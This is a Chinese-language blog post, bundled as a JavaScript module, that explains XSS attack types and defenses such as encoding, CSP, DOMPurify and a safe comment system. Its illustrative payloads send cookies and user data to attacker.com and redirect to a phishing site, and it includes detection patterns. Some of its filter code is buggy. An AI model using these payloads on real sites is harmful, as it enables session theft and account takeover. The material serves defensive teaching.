const e=`---
title: "前端安全基础与XSS防护"
excerpt: "深入探讨前端安全的基础知识，重点分析XSS攻击的原理、类型、防护策略以及最佳实践，帮助开发者构建更安全的前端应用"
coverImage: "/assets/blog/hello-world/cover.jpg"
date: "2025-12-02"
author:
  name: 小羽
  picture: "/assets/blog/authors/jj.jpeg"
ogImage:
  url: "/assets/blog/hello-world/cover.jpg"
---

# 前端安全基础与XSS防护

## 前言

随着Web应用的复杂度不断增加，前端安全问题日益凸显。跨站脚本攻击(XSS)是最常见的前端安全威胁之一，攻击者通过注入恶意脚本，可以窃取用户数据、劫持会话甚至控制用户账户。本文将深入探讨前端安全的基础知识，重点分析XSS攻击的原理、类型、防护策略以及最佳实践，帮助你构建更安全的前端应用。

## 前端安全概述

### 常见前端安全威胁

1. **跨站脚本攻击(XSS)**：注入恶意脚本到网页
2. **跨站请求伪造(CSRF)**：伪造用户请求执行未授权操作
3. **点击劫持(Clickjacking)**：欺骗用户点击隐藏的恶意元素
4. **中间人攻击(MITM)**：拦截和篡改通信数据
5. **内容安全策略(CSP)**：通过白名单控制资源加载
6. **敏感数据泄露**：不当处理敏感信息

### 安全防护原则

1. **输入验证**：对所有用户输入进行验证和过滤
2. **输出编码**：对输出到HTML的内容进行适当编码
3. **最小权限原则**：只给予必要的权限
4. **纵深防御**：多层防护，不依赖单一安全措施
5. **安全默认**：默认采用安全配置

## XSS攻击原理

### XSS攻击流程

\`\`\`html
<!-- 正常网页 -->
<!DOCTYPE html>
<html>
<head>
  <title>留言板</title>
</head>
<body>
  <h1>留言板</h1>
  <form action="/submit" method="post">
    <textarea name="message" placeholder="留下你的留言"></textarea>
    <button type="submit">提交</button>
  </form>
  
  <div id="messages">
    <!-- 留言内容 -->
    <div class="message">
      <p>这是一条正常的留言</p>
    </div>
  </div>
</body>
</html>
\`\`\`

\`\`\`javascript
// 服务器处理留言并显示
app.post('/submit', (req, res) => {
  const message = req.body.message;
  
  // 直接将用户输入存储到数据库
  db.saveMessage(message);
  
  res.redirect('/');
});

app.get('/', (req, res) => {
  const messages = db.getAllMessages();
  
  // 直接渲染用户输入到HTML
  res.render('index', { messages });
});
\`\`\`

\`\`\`html
<!-- 攻击者注入恶意脚本后的网页 -->
<!DOCTYPE html>
<html>
<head>
  <title>留言板</title>
</head>
<body>
  <h1>留言板</h1>
  <form action="/submit" method="post">
    <textarea name="message" placeholder="留下你的留言"></textarea>
    <button type="submit">提交</button>
  </form>
  
  <div id="messages">
    <!-- 正常留言 -->
    <div class="message">
      <p>这是一条正常的留言</p>
    </div>
    
    <!-- 恶意留言 - 包含XSS攻击代码 -->
    <div class="message">
      <p>
        <script>
          // 窃取用户cookie并发送到攻击者服务器
          fetch('https://attacker.com/steal?cookie=' + document.cookie);
          
          // 重定向到钓鱼网站
          window.location.href = 'https://fake-login.com';
        <\/script>
      </p>
    </div>
  </div>
</body>
</html>
\`\`\`

### XSS攻击的危害

1. **窃取敏感信息**：Cookie、Session、本地存储等
2. **劫持用户会话**：冒充用户执行操作
3. **钓鱼攻击**：伪造登录界面获取凭证
4. **恶意操作**：转账、修改密码等
5. **传播恶意软件**：下载恶意程序
6. **DDoS攻击**：利用用户浏览器发起攻击

## XSS攻击类型

### 存储型XSS

存储型XSS是最危险的XSS类型，恶意脚本被永久存储在目标服务器上，当用户访问包含恶意脚本的页面时触发。

\`\`\`javascript
// 示例：用户资料页面中的存储型XSS
// 攻击者在个人简介中注入恶意脚本
const maliciousBio = \`
  <img src="invalid-image" onerror="
    // 窃取用户信息
    const userInfo = {
      username: document.querySelector('.username').textContent,
      email: document.querySelector('.email').textContent,
      cookie: document.cookie
    };
    
    // 发送到攻击者服务器
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(userInfo)
    });
  ">
\`;

// 服务器存储恶意内容
app.post('/update-profile', (req, res) => {
  const bio = req.body.bio;
  // 直接存储用户输入，未进行过滤
  db.updateUserBio(req.user.id, bio);
  res.redirect('/profile');
});

// 其他用户访问资料页面时触发攻击
app.get('/profile/:id', (req, res) => {
  const user = db.getUser(req.params.id);
  // 直接渲染用户简介，包含恶意脚本
  res.render('profile', { user });
});
\`\`\`

### 反射型XSS

反射型XSS将恶意脚本作为请求参数，服务器反射回浏览器执行，通常需要通过社会工程学诱骗用户点击恶意链接。

\`\`\`javascript
// 示例：搜索功能中的反射型XSS
// 恶意URL: https://example.com/search?q=<script>alert('XSS')<\/script>

app.get('/search', (req, res) => {
  const query = req.query.q;
  
  // 直接将查询参数渲染到页面，未进行编码
  res.render('search-results', {
    query, // 恶意脚本被直接渲染
    results: searchEngine.search(query)
  });
});

// 搜索结果页面模板
// <h1>搜索结果: <%= query %></h1>
// <div class="results">
//   <% results.forEach(result => { %>
//     <div class="result"><%= result.title %></div>
//   <% }) %>
// </div>
\`\`\`

### DOM型XSS

DOM型XSS完全在客户端发生，恶意脚本修改DOM环境导致攻击，不经过服务器。

\`\`\`html
<!-- 示例：URL参数导致的DOM型XSS -->
<!-- 恶意URL: https://example.com/#<img src=x onerror=alert('XSS')> -->

<div id="app">
  <select id="language">
    <option value="en">English</option>
    <option value="zh">中文</option>
  </select>
  
  <div id="content">
    <!-- 内容将根据URL参数动态加载 -->
  </div>
</div>

<script>
  // 根据URL hash参数加载内容
  function loadContent() {
    const hash = window.location.hash.substring(1); // 获取#后的内容
    
    // 直接将hash内容插入DOM，未进行验证和编码
    document.getElementById('content').innerHTML = decodeURIComponent(hash);
  }
  
  // 页面加载时执行
  loadContent();
  
  // hash变化时执行
  window.addEventListener('hashchange', loadContent);
<\/script>
\`\`\`

## XSS防护策略

### 输入验证与过滤

\`\`\`javascript
// 1. 白名单验证 - 只允许特定字符
function validateInput(input, allowedChars) {
  const regex = new RegExp(\`^[\${allowedChars}]*$\`);
  return regex.test(input);
}

// 示例：只允许字母、数字和空格
const isValid = validateInput(userInput, 'a-zA-Z0-9 ');

// 2. 输入长度限制
function validateLength(input, minLength, maxLength) {
  return input.length >= minLength && input.length <= maxLength;
}

// 3. 特定格式验证
function validateEmail(email) {
  const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
  return emailRegex.test(email);
}

// 4. HTML标签过滤
function stripHtmlTags(input) {
  return input.replace(/<[^>]*>/g, '');
}

// 5. 综合验证函数
function sanitizeInput(input, options = {}) {
  const {
    allowedChars = null,
    minLength = 0,
    maxLength = 1000,
    stripHtml = true,
    trimWhitespace = true
  } = options;
  
  let sanitized = input;
  
  // 去除首尾空格
  if (trimWhitespace) {
    sanitized = sanitized.trim();
  }
  
  // 去除HTML标签
  if (stripHtml) {
    sanitized = stripHtmlTags(sanitized);
  }
  
  // 长度验证
  if (sanitized.length < minLength || sanitized.length > maxLength) {
    throw new Error(\`Input length must be between \${minLength} and \${maxLength}\`);
  }
  
  // 字符白名单验证
  if (allowedChars && !validateInput(sanitized, allowedChars)) {
    throw new Error('Input contains invalid characters');
  }
  
  return sanitized;
}

// 使用示例
try {
  const cleanInput = sanitizeInput(userInput, {
    allowedChars: 'a-zA-Z0-9 .,!?',
    maxLength: 500
  });
  
  // 使用清理后的输入
  processUserInput(cleanInput);
} catch (error) {
  console.error('Input validation failed:', error.message);
  // 显示错误信息给用户
}
\`\`\`

### 输出编码

\`\`\`javascript
// 1. HTML实体编码
function encodeHtml(str) {
  const div = document.createElement('div');
  div.appendChild(document.createTextNode(str));
  return div.innerHTML;
}

// 或者使用正则表达式实现
function encodeHtmlRegex(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// 2. URL编码
function encodeUrl(str) {
  return encodeURIComponent(str);
}

// 3. JavaScript编码
function encodeJs(str) {
  return str.replace(/[\\\\"']/g, '\\\\$&').replace(/\\u0000/g, '\\\\0');
}

// 4. CSS编码
function encodeCss(str) {
  const cssEscape = require('css.escape');
  return cssEscape(str);
}

// 5. 根据上下文选择合适的编码
function contextualEncode(input, context) {
  switch (context) {
    case 'html':
      return encodeHtml(input);
    case 'htmlAttribute':
      return encodeHtml(input).replace(/"/g, '&quot;');
    case 'js':
      return encodeJs(input);
    case 'url':
      return encodeUrl(input);
    case 'css':
      return encodeCss(input);
    default:
      return input;
  }
}

// 使用示例
// 在HTML内容中
element.innerHTML = contextualEncode(userInput, 'html');

// 在HTML属性中
element.setAttribute('title', contextualEncode(userInput, 'htmlAttribute'));

// 在JavaScript中
const script = \`console.log("\${contextualEncode(userInput, 'js')}");\`;

// 在URL中
const url = \`https://example.com/search?q=\${contextualEncode(searchQuery, 'url')}\`;
\`\`\`

### 安全的DOM操作

\`\`\`javascript
// 1. 使用textContent代替innerHTML
function safeSetText(element, text) {
  element.textContent = text; // 安全，自动转义
}

// 危险做法
// element.innerHTML = userInput; // 危险，可能导致XSS

// 2. 安全创建元素
function safeCreateElement(tag, attributes, text) {
  const element = document.createElement(tag);
  
  // 设置属性
  Object.keys(attributes).forEach(key => {
    // 对属性值进行编码
    element.setAttribute(key, contextualEncode(attributes[key], 'htmlAttribute'));
  });
  
  // 设置文本内容
  if (text) {
    element.textContent = text;
  }
  
  return element;
}

// 3. 安全的HTML插入
function safeInsertHtml(parent, html, position = 'beforeend') {
  // 使用DOMPurify库清理HTML
  const cleanHtml = DOMPurify.sanitize(html);
  parent.insertAdjacentHTML(position, cleanHtml);
}

// 4. 安全的模板渲染
function safeTemplate(template, data) {
  return template.replace(/\\{\\{(\\w+)\\}\\}/g, (match, key) => {
    return contextualEncode(data[key] || '', 'html');
  });
}

// 使用示例
const template = '<div class="user">{{name}}</div>';
const userData = { name: '<script>alert("XSS")<\/script>' };
const safeHtml = safeTemplate(template, userData);
// 结果: <div class="user">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>
\`\`\`

### Content Security Policy (CSP)

CSP是一种额外的安全层，用于检测和缓解某些类型的攻击，包括XSS。

\`\`\`html
<!-- 1. 通过HTTP头设置CSP -->
<!-- 
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.example.com
-->

<!-- 2. 通过meta标签设置CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
             script-src 'self' https://trusted.cdn.com; 
             style-src 'self' 'unsafe-inline'; 
             img-src 'self' data:; 
             connect-src 'self' https://api.example.com">

<!-- 3. CSP指令说明 -->
<!--
- default-src: 默认策略，适用于所有未指定的资源类型
- script-src: 控制脚本的来源
- style-src: 控制样式表的来源
- img-src: 控制图片的来源
- connect-src: 控制AJAX、WebSocket等连接
- font-src: 控制字体的来源
- object-src: 控制插件（如Flash）的来源
- media-src: 控制音视频的来源
- frame-src: 控制框架的来源
-->

<!-- 4. CSP源值说明 -->
<!--
- 'self': 同源
- 'none': 不允许任何来源
- 'unsafe-inline': 允许内联资源（不推荐用于脚本）
- 'unsafe-eval': 允许eval()等函数（不推荐）
- data: 允许data:协议
- https: 允许HTTPS资源
- *.example.com: 允许example.com的所有子域
-->
\`\`\`

\`\`\`javascript
// 5. 动态设置CSP（Node.js示例）
app.use((req, res, next) => {
  // 根据环境设置不同的CSP
  if (process.env.NODE_ENV === 'production') {
    res.setHeader(
      'Content-Security-Policy',
      "default-src 'self'; " +
      "script-src 'self' https://trusted.cdn.com; " +
      "style-src 'self' 'unsafe-inline'; " +
      "img-src 'self' data: https://images.example.com; " +
      "connect-src 'self' https://api.example.com; " +
      "font-src 'self' https://fonts.gstatic.com; " +
      "frame-src 'none'; " +
      "object-src 'none';"
    );
  } else {
    // 开发环境可以放宽限制
    res.setHeader(
      'Content-Security-Policy',
      "default-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
      "style-src 'self' 'unsafe-inline';"
    );
  }
  
  next();
});

// 6. CSP报告模式（只报告不阻止）
app.use((req, res, next) => {
  // 只报告违规行为，不阻止资源加载
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    "default-src 'self'; " +
    "script-src 'self' https://trusted.cdn.com; " +
    "report-uri /csp-violation-report-endpoint"
  );
  
  next();
});

// 7. 接收CSP违规报告
app.post('/csp-violation-report-endpoint', express.json(), (req, res) => {
  const report = req.body;
  
  // 记录违规报告
  console.error('CSP Violation:', report);
  
  // 可以发送到监控系统
  sendToMonitoringSystem('csp_violation', report);
  
  res.status(204).end();
});
\`\`\`

## XSS检测与防御工具

### 客户端XSS检测

\`\`\`javascript
// 1. 自动XSS扫描器
class XSSScanner {
  constructor() {
    this.vulnerabilities = [];
  }
  
  // 扫描页面中的潜在XSS点
  scan() {
    this.scanInputs();
    this.scanDynamicContent();
    this.scanEventHandlers();
    this.scanUrlParameters();
    
    return this.vulnerabilities;
  }
  
  // 扫描输入字段
  scanInputs() {
    const inputs = document.querySelectorAll('input, textarea, [contenteditable]');
    
    inputs.forEach(input => {
      // 检查是否有适当的验证
      if (!input.hasAttribute('maxlength')) {
        this.reportVulnerability({
          type: 'missing_maxlength',
          element: input,
          severity: 'medium'
        });
      }
      
      // 检查是否使用了dangerous patterns
      if (input.hasAttribute('oninput') || input.hasAttribute('onchange')) {
        const handler = input.getAttribute('oninput') || input.getAttribute('onchange');
        if (handler.includes('innerHTML') || handler.includes('outerHTML')) {
          this.reportVulnerability({
            type: 'dangerous_dom_manipulation',
            element: input,
            severity: 'high'
          });
        }
      }
    });
  }
  
  // 扫描动态内容
  scanDynamicContent() {
    const scripts = document.querySelectorAll('script');
    
    scripts.forEach(script => {
      const content = script.textContent;
      
      // 检查危险的DOM操作
      if (content.includes('innerHTML') || content.includes('outerHTML')) {
        this.reportVulnerability({
          type: 'potential_xss',
          element: script,
          severity: 'high'
        });
      }
      
      // 检查eval()使用
      if (content.includes('eval(') || content.includes('new Function(')) {
        this.reportVulnerability({
          type: 'dangerous_eval',
          element: script,
          severity: 'high'
        });
      }
    });
  }
  
  // 扫描事件处理器
  scanEventHandlers() {
    const elements = document.querySelectorAll('*');
    
    elements.forEach(element => {
      Array.from(element.attributes).forEach(attr => {
        if (attr.name.startsWith('on')) {
          // 检查事件处理器中的危险代码
          if (attr.value.includes('innerHTML') || attr.value.includes('document.write')) {
            this.reportVulnerability({
              type: 'dangerous_event_handler',
              element: element,
              severity: 'high'
            });
          }
        }
      });
    });
  }
  
  // 扫描URL参数
  scanUrlParameters() {
    const params = new URLSearchParams(window.location.search);
    
    params.forEach((value, key) => {
      // 检查参数值是否直接用于DOM操作
      if (document.body.innerHTML.includes(value)) {
        this.reportVulnerability({
          type: 'url_parameter_reflection',
          parameter: key,
          severity: 'medium'
        });
      }
    });
  }
  
  // 报告漏洞
  reportVulnerability(vulnerability) {
    this.vulnerabilities.push(vulnerability);
    
    // 在控制台输出警告
    console.warn('XSS Vulnerability Detected:', vulnerability);
    
    // 可以添加可视化标记
    if (vulnerability.element) {
      vulnerability.element.style.border = '2px solid red';
    }
  }
}

// 2. XSS过滤器
class XSSFilter {
  constructor() {
    this.init();
  }
  
  init() {
    this.interceptInnerHTML();
    this.interceptDocumentWrite();
    this.interceptEval();
  }
  
  // 拦截innerHTML设置
  interceptInnerHTML() {
    const originalSetAttribute = Element.prototype.setAttribute;
    
    Element.prototype.setAttribute = function(name, value) {
      if (name === 'innerHTML' || name === 'outerHTML') {
        // 检查是否包含潜在危险的HTML
        if (this.containsScriptOrEventHandlers(value)) {
          console.warn('Potential XSS detected in innerHTML/outerHTML assignment');
          // 可以选择阻止或清理
          return;
        }
      }
      
      return originalSetAttribute.call(this, name, value);
    };
    
    // 拦截innerHTML属性设置
    Object.defineProperty(Element.prototype, 'innerHTML', {
      set: function(value) {
        if (this.containsScriptOrEventHandlers(value)) {
          console.warn('Potential XSS detected in innerHTML assignment');
          return;
        }
        
        // 使用DOMPurify清理HTML
        const cleanValue = DOMPurify.sanitize(value);
        this.innerHTMLSetter(cleanValue);
      },
      get: function() {
        return this.innerHTMLGetter();
      },
      configurable: true
    });
  }
  
  // 拦截document.write
  interceptDocumentWrite() {
    const originalWrite = document.write;
    
    document.write = function(content) {
      if (this.containsScriptOrEventHandlers(content)) {
        console.warn('Potential XSS detected in document.write');
        return;
      }
      
      return originalWrite.call(this, content);
    };
  }
  
  // 拦截eval
  interceptEval() {
    const originalEval = window.eval;
    
    window.eval = function(code) {
      // 检查是否包含潜在危险的代码
      if (this.containsDangerousPatterns(code)) {
        console.warn('Potential XSS detected in eval');
        return;
      }
      
      return originalEval.call(this, code);
    };
  }
  
  // 检查是否包含脚本或事件处理器
  containsScriptOrEventHandlers(html) {
    const scriptPattern = /<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi;
    const eventHandlerPattern = /on\\w+\\s*=/gi;
    
    return scriptPattern.test(html) || eventHandlerPattern.test(html);
  }
  
  // 检查是否包含危险模式
  containsDangerousPatterns(code) {
    const dangerousPatterns = [
      /document\\.write\\s*\\(/gi,
      /innerHTML\\s*=/gi,
      /outerHTML\\s*=/gi,
      /eval\\s*\\(/gi,
      /new\\s+Function\\s*\\(/gi,
      /setTimeout\\s*\\(\\s*["']/gi,
      /setInterval\\s*\\(\\s*["']/gi
    ];
    
    return dangerousPatterns.some(pattern => pattern.test(code));
  }
}

// 3. 初始化安全工具
document.addEventListener('DOMContentLoaded', () => {
  // 只在开发环境启用扫描器
  if (process.env.NODE_ENV === 'development') {
    const scanner = new XSSScanner();
    const vulnerabilities = scanner.scan();
    
    if (vulnerabilities.length > 0) {
      console.error(\`Found \${vulnerabilities.length} potential XSS vulnerabilities\`);
    }
  }
  
  // 在所有环境启用过滤器
  const filter = new XSSFilter();
});
\`\`\`

### 服务端XSS防护

\`\`\`javascript
// 1. Express中间件 - XSS防护
const helmet = require('helmet');
const DOMPurify = require('isomorphic-dompurify');

// 设置安全头
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://trusted.cdn.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.example.com"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

// 2. 输入清理中间件
function sanitizeInput(req, res, next) {
  // 清理请求体
  if (req.body) {
    req.body = sanitizeObject(req.body);
  }
  
  // 清理查询参数
  if (req.query) {
    req.query = sanitizeObject(req.query);
  }
  
  // 清理路径参数
  if (req.params) {
    req.params = sanitizeObject(req.params);
  }
  
  next();
}

// 递归清理对象
function sanitizeObject(obj) {
  if (typeof obj !== 'object' || obj === null) {
    return obj;
  }
  
  if (Array.isArray(obj)) {
    return obj.map(item => sanitizeObject(item));
  }
  
  const sanitized = {};
  
  for (const key in obj) {
    if (obj.hasOwnProperty(key)) {
      const value = obj[key];
      
      if (typeof value === 'string') {
        // 清理HTML内容
        sanitized[key] = DOMPurify.sanitize(value);
      } else if (typeof value === 'object') {
        // 递归清理嵌套对象
        sanitized[key] = sanitizeObject(value);
      } else {
        // 其他类型保持不变
        sanitized[key] = value;
      }
    }
  }
  
  return sanitized;
}

// 3. 输出编码中间件
function encodeOutput(req, res, next) {
  const originalRender = res.render;
  
  res.render = function(view, options, callback) {
    // 对选项进行编码
    if (options) {
      options = encodeObject(options);
    }
    
    return originalRender.call(this, view, options, callback);
  };
  
  next();
}

// 递归编码对象
function encodeObject(obj) {
  if (typeof obj !== 'object' || obj === null) {
    return obj;
  }
  
  if (Array.isArray(obj)) {
    return obj.map(item => encodeObject(item));
  }
  
  const encoded = {};
  
  for (const key in obj) {
    if (obj.hasOwnProperty(key)) {
      const value = obj[key];
      
      if (typeof value === 'string') {
        // HTML实体编码
        encoded[key] = encodeHtml(value);
      } else if (typeof value === 'object') {
        // 递归编码嵌套对象
        encoded[key] = encodeObject(value);
      } else {
        // 其他类型保持不变
        encoded[key] = value;
      }
    }
  }
  
  return encoded;
}

// 4. 应用中间件
app.use(sanitizeInput);
app.use(encodeOutput);

// 5. 安全的模板渲染
app.get('/profile/:id', (req, res) => {
  const userId = req.params.id;
  const user = db.getUser(userId);
  
  // 使用安全的模板渲染
  res.render('profile', {
    user: {
      name: encodeHtml(user.name),
      bio: DOMPurify.sanitize(user.bio), // 允许部分HTML但清理危险内容
      avatar: encodeHtml(user.avatar)
    }
  });
});
\`\`\`

## 实际应用案例

### 安全的评论系统

\`\`\`javascript
// 1. 前端评论组件
class CommentSystem {
  constructor(container) {
    this.container = container;
    this.comments = [];
    this.init();
  }
  
  init() {
    this.renderForm();
    this.loadComments();
  }
  
  // 渲染评论表单
  renderForm() {
    const form = document.createElement('form');
    form.id = 'comment-form';
    
    const nameInput = document.createElement('input');
    nameInput.type = 'text';
    nameInput.name = 'name';
    nameInput.placeholder = '您的名字';
    nameInput.required = true;
    nameInput.maxLength = 50;
    
    const commentTextarea = document.createElement('textarea');
    commentTextarea.name = 'comment';
    commentTextarea.placeholder = '写下您的评论';
    commentTextarea.required = true;
    commentTextarea.maxLength = 500;
    
    const submitButton = document.createElement('button');
    submitButton.type = 'submit';
    submitButton.textContent = '提交评论';
    
    form.appendChild(nameInput);
    form.appendChild(commentTextarea);
    form.appendChild(submitButton);
    
    form.addEventListener('submit', this.handleSubmit.bind(this));
    
    this.container.appendChild(form);
  }
  
  // 处理表单提交
  handleSubmit(event) {
    event.preventDefault();
    
    const formData = new FormData(event.target);
    const name = formData.get('name');
    const comment = formData.get('comment');
    
    // 客户端验证
    if (!this.validateComment(name, comment)) {
      return;
    }
    
    // 发送评论到服务器
    this.submitComment(name, comment);
  }
  
  // 验证评论
  validateComment(name, comment) {
    // 检查长度
    if (name.length < 2 || name.length > 50) {
      this.showError('名字长度应在2-50个字符之间');
      return false;
    }
    
    if (comment.length < 5 || comment.length > 500) {
      this.showError('评论长度应在5-500个字符之间');
      return false;
    }
    
    // 检查是否包含潜在危险内容
    if (this.containsSuspiciousContent(comment)) {
      this.showError('评论包含不适当的内容');
      return false;
    }
    
    return true;
  }
  
  // 检查可疑内容
  containsSuspiciousContent(text) {
    const suspiciousPatterns = [
      /<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi,
      /javascript:/gi,
      /on\\w+\\s*=/gi,
      /data:text\\/html/gi
    ];
    
    return suspiciousPatterns.some(pattern => pattern.test(text));
  }
  
  // 提交评论
  async submitComment(name, comment) {
    try {
      const response = await fetch('/api/comments', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ name, comment })
      });
      
      if (!response.ok) {
        throw new Error('提交评论失败');
      }
      
      const result = await response.json();
      
      if (result.success) {
        // 清空表单
        document.getElementById('comment-form').reset();
        
        // 重新加载评论
        this.loadComments();
      } else {
        this.showError(result.message || '提交评论失败');
      }
    } catch (error) {
      this.showError('网络错误，请稍后再试');
      console.error('Error submitting comment:', error);
    }
  }
  
  // 加载评论
  async loadComments() {
    try {
      const response = await fetch('/api/comments');
      const comments = await response.json();
      
      this.comments = comments;
      this.renderComments();
    } catch (error) {
      console.error('Error loading comments:', error);
    }
  }
  
  // 渲染评论
  renderComments() {
    const commentsContainer = document.getElementById('comments-container') || 
                             this.createCommentsContainer();
    
    // 清空现有评论
    commentsContainer.innerHTML = '';
    
    // 渲染每条评论
    this.comments.forEach(comment => {
      const commentElement = this.createCommentElement(comment);
      commentsContainer.appendChild(commentElement);
    });
  }
  
  // 创建评论元素
  createCommentElement(comment) {
    const commentDiv = document.createElement('div');
    commentDiv.className = 'comment';
    
    // 安全地创建评论内容
    const nameElement = document.createElement('h4');
    nameElement.textContent = comment.name; // 使用textContent，安全
    
    const timeElement = document.createElement('time');
    timeElement.textContent = new Date(comment.createdAt).toLocaleString();
    
    const contentElement = document.createElement('p');
    // 允许部分HTML标签但清理危险内容
    contentElement.innerHTML = DOMPurify.sanitize(comment.content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
      ALLOWED_ATTR: ['href', 'title'],
      ALLOW_DATA_ATTR: false
    });
    
    commentDiv.appendChild(nameElement);
    commentDiv.appendChild(timeElement);
    commentDiv.appendChild(contentElement);
    
    return commentDiv;
  }
  
  // 创建评论容器
  createCommentsContainer() {
    const container = document.createElement('div');
    container.id = 'comments-container';
    this.container.appendChild(container);
    return container;
  }
  
  // 显示错误信息
  showError(message) {
    const errorElement = document.createElement('div');
    errorElement.className = 'error-message';
    errorElement.textContent = message;
    
    this.container.appendChild(errorElement);
    
    // 3秒后自动移除
    setTimeout(() => {
      if (errorElement.parentNode) {
        errorElement.parentNode.removeChild(errorElement);
      }
    }, 3000);
  }
}

// 2. 服务器端API
const express = require('express');
const DOMPurify = require('isomorphic-dompurify');
const rateLimit = require('express-rate-limit');

const app = express();

// 限制评论提交频率
const commentLimiter = rateLimit({
  windowMs: 60 * 1000, // 1分钟
  max: 5, // 每分钟最多5条评论
  message: { success: false, message: '评论过于频繁，请稍后再试' }
});

// 解析JSON请求体
app.use(express.json());

// 提交评论API
app.post('/api/comments', commentLimiter, (req, res) => {
  const { name, comment } = req.body;
  
  // 服务器端验证
  if (!name || !comment) {
    return res.status(400).json({
      success: false,
      message: '名字和评论不能为空'
    });
  }
  
  if (name.length < 2 || name.length > 50) {
    return res.status(400).json({
      success: false,
      message: '名字长度应在2-50个字符之间'
    });
  }
  
  if (comment.length < 5 || comment.length > 500) {
    return res.status(400).json({
      success: false,
      message: '评论长度应在5-500个字符之间'
    });
  }
  
  // 清理输入内容
  const cleanName = DOMPurify.sanitize(name, { ALLOWED_TAGS: [] }); // 不允许任何HTML标签
  const cleanComment = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'br', 'p'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false
  });
  
  // 保存到数据库
  const newComment = {
    id: Date.now(),
    name: cleanName,
    content: cleanComment,
    createdAt: new Date().toISOString()
  };
  
  db.saveComment(newComment);
  
  res.json({ success: true });
});

// 获取评论API
app.get('/api/comments', (req, res) => {
  const comments = db.getAllComments();
  res.json(comments);
});

// 3. 初始化评论系统
document.addEventListener('DOMContentLoaded', () => {
  const commentContainer = document.getElementById('comment-section');
  if (commentContainer) {
    new CommentSystem(commentContainer);
  }
});
\`\`\`

## 总结

前端安全是Web开发中不可忽视的重要环节，XSS攻击作为最常见的安全威胁之一，需要我们采取多层防护策略：

1. **输入验证**：对所有用户输入进行严格验证和过滤
2. **输出编码**：根据上下文对输出内容进行适当编码
3. **内容安全策略**：通过CSP限制资源加载来源
4. **安全API设计**：在服务器端进行输入清理和验证
5. **定期安全审计**：使用工具检测潜在漏洞

通过本文介绍的方法和最佳实践，你可以有效防范XSS攻击，构建更安全的前端应用。记住，安全是一个持续的过程，需要不断学习和适应新的威胁和技术。`;export{e as default};
//# sourceMappingURL=22-CKZDntx-.js.map
